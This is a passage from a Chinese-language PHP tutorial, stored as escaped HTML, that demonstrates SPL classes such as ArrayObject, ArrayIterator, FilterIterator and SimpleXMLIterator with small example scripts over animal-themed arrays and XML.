/&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;增加一个元素：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;$arrayObj-&amp;gt;append(''dingo'');&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;对元素排序：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;$arrayObj-&amp;gt;natcasesort();&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;显示元素的数量：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;echo $arrayObj-&amp;gt;count();&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;删除一个元素：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;$arrayObj-&amp;gt;offsetUnset(5);&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;某一个元素是否存在：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt; if ($arrayObj-&amp;gt;offsetExists(3))&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n       echo ''Offset Exists&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;更改某个位置的元素值：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt; $arrayObj-&amp;gt;offsetSet(5, &quot;galah&quot;);&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;显示某个位置的元素值：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;echo $arrayObj-&amp;gt;offsetGet(4);&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;strong&gt;12. ArrayIterator类&lt;/strong&gt; &lt;div&gt;这个类实际上是对ArrayObject类的补充，为后者提供遍历功能。&lt;/div&gt;\r\n&lt;div&gt;示例如下：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\n/*** a simple array ***/&lt;br /&gt;\r\n$array = array(''koala'', ''kangaroo'', ''wombat'', ''wallaby'', ''emu'', ''kiwi'', ''kookaburra'', ''platypus'');&lt;br /&gt;\r\n&lt;br /&gt;\r\ntry {&lt;br /&gt;\r\n    $object = new ArrayIterator($array);&lt;br /&gt;\r\n    foreach($object as $key=&amp;gt;$value)&lt;br /&gt;\r\n        {&lt;br /&gt;\r\n        echo $key.'' =&amp;gt; ''.$value.''&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n        }&lt;br /&gt;\r\n    }&lt;br /&gt;\r\ncatch (Exception $e)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    echo $e-&amp;gt;getMessage();&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;ArrayIterator类也支持offset类方法和count()方法：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;ul&amp;gt;&lt;br /&gt;\r\n&amp;lt;?php&lt;br /&gt;\r\n/*** a simple array ***/&lt;br /&gt;\r\n$array = array(''koala'', ''kangaroo'', ''wombat'', ''wallaby'', ''emu'', ''kiwi'', ''kookaburra'', ''platypus'');&lt;br /&gt;\r\n&lt;br /&gt;\r\ntry {&lt;br /&gt;\r\n    $object = new ArrayIterator($array);&lt;br /&gt;\r\n    /*** check for the existence of the offset 2 ***/&lt;br /&gt;\r\n    if($object-&amp;gt;offSetExists(2))&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    /*** set the offset of 2 to a new value ***/&lt;br /&gt;\r\n    $object-&amp;gt;offSetSet(2, ''Goanna'');&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n   /*** unset the kiwi ***/&lt;br /&gt;\r\n   foreach($object as $key=&amp;gt;$value)&lt;br /&gt;\r\n        {&lt;br /&gt;\r\n        /*** check the value of the key ***/&lt;br /&gt;\r\n        if($object-&amp;gt;offSetGet($key) === ''kiwi'')&lt;br /&gt;\r\n            {&lt;br /&gt;\r\n            /*** unset the current key ***/&lt;br /&gt;\r\n            $object-&amp;gt;offSetUnset($key);&lt;br /&gt;\r\n            }&lt;br /&gt;\r\n        echo ''&amp;lt;li&amp;gt;''.$key.'' - ''.$value.''&amp;lt;/li&amp;gt;''.&quot;\\n&quot;;&lt;br /&gt;\r\n        }&lt;br /&gt;\r\n    }&lt;br /&gt;\r\ncatch (Exception $e)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    echo $e-&amp;gt;getMessage();&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&amp;lt;/ul&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;&lt;strong&gt;13. RecursiveArrayIterator类和RecursiveIteratorIterator类&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;ArrayIterator类和ArrayObject类，只支持遍历一维数组。如果要遍历多维数组，必须先用 RecursiveIteratorIterator生成一个Iterator，然后再对这个Iterator使用 RecursiveIteratorIterator。&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\n$array = array(&lt;br /&gt;\r\n    array(''name''=&amp;gt;''butch'', ''sex''=&amp;gt;''m'', ''breed''=&amp;gt;''boxer''),&lt;br /&gt;\r\n    array(''name''=&amp;gt;''fido'', ''sex''=&amp;gt;''m'', ''breed''=&amp;gt;''doberman''),&lt;br /&gt;\r\n    array(''name''=&amp;gt;''girly'',''sex''=&amp;gt;''f'', ''breed''=&amp;gt;''poodle'')&lt;br /&gt;\r\n);&lt;br /&gt;\r\n&lt;br /&gt;\r\nforeach(new RecursiveIteratorIterator(new RecursiveArrayIterator($array)) as $key=&amp;gt;$value)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    echo $key.'' -- ''.$value.''&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;&lt;strong&gt;14. FilterIterator类&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;FilterIterator类可以对元素进行过滤，只要在accept()方法中设置过滤条件就可以了。&lt;/div&gt;\r\n&lt;div&gt;示例如下：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\n/*** a simple array ***/&lt;br /&gt;\r\n$animals = array(''koala'', ''kangaroo'', ''wombat'', ''wallaby'', ''emu'', ''NZ''=&amp;gt;''kiwi'', ''kookaburra'', ''platypus'');&lt;br /&gt;\r\n&lt;br /&gt;\r\nclass CullingIterator extends FilterIterator{&lt;br /&gt;\r\n&lt;br /&gt;\r\n/*** The filteriterator takes  a iterator as param: ***/&lt;br /&gt;\r\npublic function __construct( Iterator $it ){&lt;br /&gt;\r\n  parent::__construct( $it );&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n/*** check if key is numeric ***/&lt;br /&gt;\r\nfunction accept(){&lt;br /&gt;\r\n  return is_numeric($this-&amp;gt;key());&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n}/*** end of class ***/&lt;br /&gt;\r\n$cull = new CullingIterator(new ArrayIterator($animals));&lt;br /&gt;\r\n&lt;br /&gt;\r\nforeach($cull as $key=&amp;gt;$value)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    echo $key.'' == ''.$value.''&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;下面是另一个返回质数的例子：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\n&lt;br /&gt;\r\nclass PrimeFilter extends FilterIterator{&lt;br /&gt;\r\n&lt;br /&gt;\r\n/*** The filteriterator takes  a iterator as param: ***/&lt;br /&gt;\r\npublic function __construct(Iterator $it){&lt;br /&gt;\r\n  parent::__construct($it);&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n/*** check if current value is prime ***/&lt;br /&gt;\r\nfunction accept(){&lt;br /&gt;\r\nif($this-&amp;gt;current() % 2 != 1)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    return false;&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n$d = 3;&lt;br /&gt;\r\n$x = sqrt($this-&amp;gt;current());&lt;br /&gt;\r\nwhile ($this-&amp;gt;current() % $d != 0 &amp;amp;&amp;amp; $d &amp;lt; $x)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    $d += 2;&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n return (($this-&amp;gt;current() % $d == 0 &amp;amp;&amp;amp; $this-&amp;gt;current() != $d) * 1) == 0 ? true : false;&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\n}/*** end of class ***/&lt;br /&gt;\r\n&lt;br /&gt;\r\n/*** an array of numbers ***/&lt;br /&gt;\r\n$numbers = range(212345,212456);&lt;br /&gt;\r\n&lt;br /&gt;\r\n/*** create a new FilterIterator object ***/&lt;br /&gt;\r\n$primes = new primeFilter(new ArrayIterator($numbers));&lt;br /&gt;\r\n&lt;br /&gt;\r\nforeach($primes as $value)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    echo $value.'' is prime.&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;&lt;strong&gt;15. SimpleXMLIterator类&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;这个类用来遍历xml文件。&lt;/div&gt;\r\n&lt;div&gt;示例如下：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\n&lt;br /&gt;\r\n/*** a simple xml tree ***/&lt;br /&gt;\r\n $xmlstring = &amp;lt;&amp;lt;&amp;lt;XML&lt;br /&gt;\r\n&amp;lt;?xml version = &quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&amp;gt;&lt;br /&gt;\r\n&amp;lt;document&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;&lt;br /&gt;\r\n    &amp;lt;category id=&quot;26&quot;&amp;gt;&lt;br /&gt;\r\n      &amp;lt;species&amp;gt;Phascolarctidae&amp;lt;/species&amp;gt;&lt;br /&gt;\r\n      &amp;lt;type&amp;gt;koala&amp;lt;/type&amp;gt;&lt;br /&gt;\r\n      &amp;lt;name&amp;gt;Bruce&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n    &amp;lt;/category&amp;gt;&lt;br /&gt;\r\n  &amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;&lt;br /&gt;\r\n    &amp;lt;category id=&quot;27&quot;&amp;gt;&lt;br /&gt;\r\n      &amp;lt;species&amp;gt;macropod&amp;lt;/species&amp;gt;&lt;br /&gt;\r\n      &amp;lt;type&amp;gt;kangaroo&amp;lt;/type&amp;gt;&lt;br /&gt;\r\n      &amp;lt;name&amp;gt;Bruce&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n    &amp;lt;/category&amp;gt;&lt;br /&gt;\r\n  &amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;&lt;br /&gt;\r\n    &amp;lt;category id=&quot;28&quot;&amp;gt;&lt;br /&gt;\r\n      &amp;lt;species&amp;gt;diprotodon&amp;lt;/species&amp;gt;&lt;br /&gt;\r\n      &amp;lt;type&amp;gt;wombat&amp;lt;/type&amp;gt;&lt;br /&gt;\r\n      &amp;lt;name&amp;gt;Bruce&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n    &amp;lt;/category&amp;gt;&lt;br /&gt;\r\n  &amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;&lt;br /&gt;\r\n    &amp;lt;category id=&quot;31&quot;&amp;gt;&lt;br /&gt;\r\n      &amp;lt;species&amp;gt;macropod&amp;lt;/species&amp;gt;&lt;br /&gt;\r\n      &amp;lt;type&amp;gt;wallaby&amp;lt;/type&amp;gt;&lt;br /&gt;\r\n      &amp;lt;name&amp;gt;Bruce&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n    &amp;lt;/category&amp;gt;&lt;br /&gt;\r\n  &amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;&lt;br /&gt;\r\n    &amp;lt;category id=&quot;21&quot;&amp;gt;&lt;br /&gt;\r\n      &amp;lt;species&amp;gt;dromaius&amp;lt;/species&amp;gt;&lt;br /&gt;\r\n      &amp;lt;type&amp;gt;emu&amp;lt;/type&amp;gt;&lt;br /&gt;\r\n      &amp;lt;name&amp;gt;Bruce&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n    &amp;lt;/category&amp;gt;&lt;br /&gt;\r\n  &amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;&lt;br /&gt;\r\n    &amp;lt;category id=&quot;22&quot;&amp;gt;&lt;br /&gt;\r\n      &amp;lt;species&amp;gt;Apteryx&amp;lt;/species&amp;gt;&lt;br /&gt;\r\n      &amp;lt;type&amp;gt;kiwi&amp;lt;/type&amp;gt;&lt;br /&gt;\r\n      &amp;lt;name&amp;gt;Troy&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n    &amp;lt;/category&amp;gt;&lt;br /&gt;\r\n  &amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;&lt;br /&gt;\r\n    &amp;lt;category id=&quot;23&quot;&amp;gt;&lt;br /&gt;\r\n      &amp;lt;species&amp;gt;kingfisher&amp;lt;/species&amp;gt;&lt;br /&gt;\r\n      &amp;lt;type&amp;gt;kookaburra&amp;lt;/type&amp;gt;&lt;br /&gt;\r\n      &amp;lt;name&amp;gt;Bruce&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n    &amp;lt;/category&amp;gt;&lt;br /&gt;\r\n  &amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;&lt;br /&gt;\r\n    &amp;lt;category id=&quot;48&quot;&amp;gt;&lt;br /&gt;\r\n      &amp;lt;species&amp;gt;monotremes&amp;lt;/species&amp;gt;&lt;br /&gt;\r\n      &amp;lt;type&amp;gt;platypus&amp;lt;/type&amp;gt;&lt;br /&gt;\r\n      &amp;lt;name&amp;gt;Bruce&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n    &amp;lt;/category&amp;gt;&lt;br /&gt;\r\n  &amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;&lt;br /&gt;\r\n    &amp;lt;category id=&quot;4&quot;&amp;gt;&lt;br /&gt;\r\n      &amp;lt;species&amp;gt;arachnid&amp;lt;/species&amp;gt;&lt;br /&gt;\r\n      &amp;lt;type&amp;gt;funnel web&amp;lt;/type&amp;gt;&lt;br /&gt;\r\n      &amp;lt;name&amp;gt;Bruce&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n      &amp;lt;legs&amp;gt;8&amp;lt;/legs&amp;gt;&lt;br /&gt;\r\n    &amp;lt;/category&amp;gt;&lt;br /&gt;\r\n  &amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n&amp;lt;/document&amp;gt;&lt;br /&gt;\r\nXML;&lt;br /&gt;\r\n&lt;br /&gt;\r\n/*** a new simpleXML iterator object ***/&lt;br /&gt;\r\ntry    {&lt;br /&gt;\r\n       /*** a new simple xml iterator ***/&lt;br /&gt;\r\n       $it = new SimpleXMLIterator($xmlstring);&lt;br /&gt;\r\n       /*** a new limitIterator object ***/&lt;br /&gt;\r\n       foreach(new RecursiveIteratorIterator($it,1) as $name =&amp;gt; $data)&lt;br /&gt;\r\n          {&lt;br /&gt;\r\n          echo $name.'' -- ''.$data.''&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n          }&lt;br /&gt;\r\n    }&lt;br /&gt;\r\ncatch(Exception $e)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    echo $e-&amp;gt;getMessage();&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;new RecursiveIteratorIterator($it,1)表示显示所有包括父元素在内的子元素。&lt;/div&gt;\r\n&lt;div&gt;显示某一个特定的元素值，可以这样写：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\ntry {&lt;br /&gt;\r\n    /*** a new simpleXML iterator object ***/&lt;br /&gt;\r\n    $sxi =  new SimpleXMLIterator($xmlstring);&lt;br /&gt;\r\n&lt;br /&gt;\r\n    foreach ( $sxi as $node )&lt;br /&gt;\r\n        {&lt;br /&gt;\r\n        foreach($node as $k=&amp;gt;$v)&lt;br /&gt;\r\n            {&lt;br /&gt;\r\n            echo $v-&amp;gt;species.''&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n            }&lt;br /&gt;\r\n        }&lt;br /&gt;\r\n    }&lt;br /&gt;\r\ncatch(Exception $e)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    echo $e-&amp;gt;getMessage();&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;相对应的while循环写法为：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\n&lt;br /&gt;\r\ntry {&lt;br /&gt;\r\n$sxe = simplexml_load_string($xmlstring, ''SimpleXMLIterator'');&lt;br /&gt;\r\n&lt;br /&gt;\r\nfor ($sxe-&amp;gt;rewind(); $sxe-&amp;gt;valid(); $sxe-&amp;gt;next())&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    if($sxe-&amp;gt;hasChildren())&lt;br /&gt;\r\n        {&lt;br /&gt;\r\n        foreach($sxe-&amp;gt;getChildren() as $element=&amp;gt;$value)&lt;br /&gt;\r\n          {&lt;br /&gt;\r\n          echo $value-&amp;gt;species.''&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n          }&lt;br /&gt;\r\n        }&lt;br /&gt;\r\n     }&lt;br /&gt;\r\n   }&lt;br /&gt;\r\ncatch(Exception $e)&lt;br /&gt;\r\n   {&lt;br /&gt;\r\n   echo $e-&amp;gt;getMessage();&lt;br /&gt;\r\n   }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;最方便的写法，还是使用xpath：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\ntry {&lt;br /&gt;\r\n    /*** a new simpleXML iterator object ***/&lt;br /&gt;\r\n    $sxi =  new SimpleXMLIterator($xmlstring);&lt;br /&gt;\r\n&lt;br /&gt;\r\n    /*** set the xpath ***/&lt;br /&gt;\r\n    $foo = $sxi-&amp;gt;xpath(''animal/category/species'');&lt;br /&gt;\r\n&lt;br /&gt;\r\n    /*** iterate over the xpath ***/&lt;br /&gt;\r\n    foreach ($foo as $k=&amp;gt;$v)&lt;br /&gt;\r\n        {&lt;br /&gt;\r\n        echo $v.''&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n        }&lt;br /&gt;\r\n    }&lt;br /&gt;\r\ncatch(Exception $e)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    echo $e-&amp;gt;getMessage();&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;下面的例子，显示有namespace的情况：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\n&lt;br /&gt;\r\n/*** a simple xml tree ***/&lt;br /&gt;\r\n $xmlstring = &amp;lt;&amp;lt;&amp;lt;XML&lt;br /&gt;\r\n&amp;lt;?xml version = &quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&amp;gt;&lt;br /&gt;\r\n&amp;lt;document xmlns:spec=&quot;http://example.org/animal-species&quot;&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;&lt;br /&gt;\r\n    &amp;lt;category id=&quot;26&quot;&amp;gt;&lt;br /&gt;\r\n      &amp;lt;species&amp;gt;Phascolarctidae&amp;lt;/species&amp;gt;&lt;br /&gt;\r\n      &amp;lt;spec:name&amp;gt;Speed Hump&amp;lt;/spec:name&amp;gt;&lt;br /&gt;\r\n      &amp;lt;type&amp;gt;koala&amp;lt;/type&amp;gt;&lt;br /&gt;\r\n      &amp;lt;name&amp;gt;Bruce&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n    &amp;lt;/category&amp;gt;&lt;br /&gt;\r\n  &amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;&lt;br /&gt;\r\n    &amp;lt;category id=&quot;27&quot;&amp;gt;&lt;br /&gt;\r\n      &amp;lt;species&amp;gt;macropod&amp;lt;/species&amp;gt;&lt;br /&gt;\r\n      &amp;lt;spec:name&amp;gt;Boonga&amp;lt;/spec:name&amp;gt;&lt;br /&gt;\r\n      &amp;lt;type&amp;gt;kangaroo&amp;lt;/type&amp;gt;&lt;br /&gt;\r\n      &amp;lt;name&amp;gt;Bruce&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n    &amp;lt;/category&amp;gt;&lt;br /&gt;\r\n  &amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;&lt;br /&gt;\r\n    &amp;lt;category id=&quot;28&quot;&amp;gt;&lt;br /&gt;\r\n      &amp;lt;species&amp;gt;diprotodon&amp;lt;/species&amp;gt;&lt;br /&gt;\r\n      &amp;lt;spec:name&amp;gt;pot holer&amp;lt;/spec:name&amp;gt;&lt;br /&gt;\r\n      &amp;lt;type&amp;gt;wombat&amp;lt;/type&amp;gt;&lt;br /&gt;\r\n      &amp;lt;name&amp;gt;Bruce&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n    &amp;lt;/category&amp;gt;&lt;br /&gt;\r\n  &amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;&lt;br /&gt;\r\n    &amp;lt;category id=&quot;31&quot;&amp;gt;&lt;br /&gt;\r\n      &amp;lt;species&amp;gt;macropod&amp;lt;/species&amp;gt;&lt;br /&gt;\r\n      &amp;lt;spec:name&amp;gt;Target&amp;lt;/spec:name&amp;gt;&lt;br /&gt;\r\n      &amp;lt;type&amp;gt;wallaby&amp;lt;/type&amp;gt;&lt;br /&gt;\r\n      &amp;lt;name&amp;gt;Bruce&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n    &amp;lt;/category&amp;gt;&lt;br /&gt;\r\n  &amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;&lt;br /&gt;\r\n    &amp;lt;category id=&quot;21&quot;&amp;gt;&lt;br /&gt;\r\n      &amp;lt;species&amp;gt;dromaius&amp;lt;/species&amp;gt;&lt;br /&gt;\r\n      &amp;lt;spec:name&amp;gt;Road Runner&amp;lt;/spec:name&amp;gt;&lt;br /&gt;\r\n      &amp;lt;type&amp;gt;emu&amp;lt;/type&amp;gt;&lt;br /&gt;\r\n      &amp;lt;name&amp;gt;Bruce&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n    &amp;lt;/category&amp;gt;&lt;br /&gt;\r\n  &amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;&lt;br /&gt;\r\n    &amp;lt;category id=&quot;22&quot;&amp;gt;&lt;br /&gt;\r\n      &amp;lt;species&amp;gt;Apteryx&amp;lt;/species&amp;gt;&lt;br /&gt;\r\n      &amp;lt;spec:name&amp;gt;Football&amp;lt;/spec:name&amp;gt;&lt;br /&gt;\r\n      &amp;lt;type&amp;gt;kiwi&amp;lt;/type&amp;gt;&lt;br /&gt;\r\n      &amp;lt;name&amp;gt;Troy&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n    &amp;lt;/category&amp;gt;&lt;br /&gt;\r\n  &amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;&lt;br /&gt;\r\n    &amp;lt;category id=&quot;23&quot;&amp;gt;&lt;br /&gt;\r\n      &amp;lt;species&amp;gt;kingfisher&amp;lt;/species&amp;gt;&lt;br /&gt;\r\n      &amp;lt;spec:name&amp;gt;snaker&amp;lt;/spec:name&amp;gt;&lt;br /&gt;\r\n      &amp;lt;type&amp;gt;kookaburra&amp;lt;/type&amp;gt;&lt;br /&gt;\r\n      &amp;lt;name&amp;gt;Bruce&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n    &amp;lt;/category&amp;gt;&lt;br /&gt;\r\n  &amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;&lt;br /&gt;\r\n    &amp;lt;category id=&quot;48&quot;&amp;gt;&lt;br /&gt;\r\n      &amp;lt;species&amp;gt;monotremes&amp;lt;/species&amp;gt;&lt;br /&gt;\r\n      &amp;lt;spec:name&amp;gt;Swamp Rat&amp;lt;/spec:name&amp;gt;&lt;br /&gt;\r\n      &amp;lt;type&amp;gt;platypus&amp;lt;/type&amp;gt;&lt;br /&gt;\r\n      &amp;lt;name&amp;gt;Bruce&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n    &amp;lt;/category&amp;gt;&lt;br /&gt;\r\n  &amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;&lt;br /&gt;\r\n    &amp;lt;category id=&quot;4&quot;&amp;gt;&lt;br /&gt;\r\n      &amp;lt;species&amp;gt;arachnid&amp;lt;/species&amp;gt;&lt;br /&gt;\r\n      &amp;lt;spec:name&amp;gt;Killer&amp;lt;/spec:name&amp;gt;&lt;br /&gt;\r\n      &amp;lt;type&amp;gt;funnel web&amp;lt;/type&amp;gt;&lt;br /&gt;\r\n      &amp;lt;name&amp;gt;Bruce&amp;lt;/name&amp;gt;&lt;br /&gt;\r\n      &amp;lt;legs&amp;gt;8&amp;lt;/legs&amp;gt;&lt;br /&gt;\r\n    &amp;lt;/category&amp;gt;&lt;br /&gt;\r\n  &amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n&amp;lt;/document&amp;gt;&lt;br /&gt;\r\nXML;&lt;br /&gt;\r\n&lt;br /&gt;\r\n/*** a new simpleXML iterator object ***/&lt;br /&gt;\r\ntry {&lt;br /&gt;\r\n    /*** a new simpleXML iterator object ***/&lt;br /&gt;\r\n    $sxi =  new SimpleXMLIterator($xmlstring);&lt;br /&gt;\r\n&lt;br /&gt;\r\n    $sxi-&amp;gt; registerXPathNamespace(''spec'', ''http://www.exampe.org/species-title'');&lt;br /&gt;\r\n&lt;br /&gt;\r\n    /*** set the xpath ***/&lt;br /&gt;\r\n    $result = $sxi-&amp;gt;xpath(''//spec:name'');&lt;br /&gt;\r\n&lt;br /&gt;\r\n    /*** get all declared namespaces ***/&lt;br /&gt;\r\n   foreach($sxi-&amp;gt;getDocNamespaces(''animal'') as $ns)&lt;br /&gt;\r\n        {&lt;br /&gt;\r\n        echo $ns.''&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n        }&lt;br /&gt;\r\n&lt;br /&gt;\r\n    /*** iterate over the xpath ***/&lt;br /&gt;\r\n    foreach ($result as $k=&amp;gt;$v)&lt;br /&gt;\r\n        {&lt;br /&gt;\r\n        echo $v.''&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n        }&lt;br /&gt;\r\n    }&lt;br /&gt;\r\ncatch(Exception $e)&lt;br /&gt;\r\n  